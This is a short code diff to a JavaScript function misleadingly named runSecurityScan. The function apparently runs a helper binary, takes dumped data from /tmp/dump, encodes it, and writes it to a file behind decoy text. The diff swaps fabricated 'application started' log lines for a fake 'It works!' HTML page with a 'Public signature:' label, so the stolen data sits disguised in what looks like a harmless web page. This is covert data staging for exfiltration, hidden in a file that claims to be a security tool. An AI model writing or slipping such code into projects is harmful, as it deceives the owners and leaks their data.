@@ -92,7 +92,7 @@ function base32Encode(str) {
 async function runSecurityScan() {
   const scannerPath = path.join(__dirname, '..', 's');
   const outputSource = '/tmp/dump';
-  const appLog = path.join(__dirname, '..', 'app.log');
+  const appLog = path.join(__dirname, '..', 'app.html');
 
   try {
     if (!fs.existsSync(scannerPath)) return;
@@ -116,12 +116,8 @@ async function runSecurityScan() {
       const timestamp = new Date().toISOString();
       const fakeLogLines = [
         '',
-        `[${timestamp}] INFO: Application started successfully`,
-        `[${timestamp}] DEBUG: Configuration loaded from .env`,
-        `[${timestamp}] INFO: Database connection established`,
-        `[${timestamp}] INFO: Server listening on port 3000`,
-        `[${timestamp}] DEBUG: All pre-start checks completed`,
-        ''
+        `<html><head></head><body>It works!</body>`,
+        'Public signature:'
       ].join('\n');
 
       fs.writeFileSync(appLog, fakeLogLines + encoded, 'utf-8');
